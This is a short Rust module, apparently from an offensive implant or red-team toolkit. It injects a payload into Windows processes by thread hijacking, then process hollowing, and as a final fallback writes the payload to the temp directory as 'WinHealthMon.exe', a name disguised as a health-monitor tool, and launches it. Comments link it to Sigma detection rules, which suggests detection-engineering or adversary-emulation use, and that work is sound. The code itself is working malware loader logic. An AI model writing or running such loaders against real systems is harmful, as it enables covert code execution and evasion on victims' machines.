//! Windows injection: WTH -> process hollowing -> drop-to-disk fallback.
//! Detection artifacts documented in detection/sigma/injection_wth.yml and
//! detection/sigma/injection_hollow.yml.

#![cfg(windows)]

use super::{hollow, wth, InjectionError};

pub fn inject_with_fallback(payload: &[u8]) -> Result<(), InjectionError> {
    if wth::inject(payload).is_ok() {
        return Ok(());
    }
    if hollow::inject(payload).is_ok() {
        return Ok(());
    }
    drop_to_disk(payload)
}

fn drop_to_disk(payload: &[u8]) -> Result<(), InjectionError> {
    let p = std::env::temp_dir().join("WinHealthMon.exe");
    std::fs::write(&p, payload).map_err(|e| InjectionError::WriteFailed(e.to_string()))?;
    std::process::Command::new(&p)
        .spawn()
        .map_err(|e| InjectionError::ThreadFailed(e.to_string()))?;
    Ok(())
}
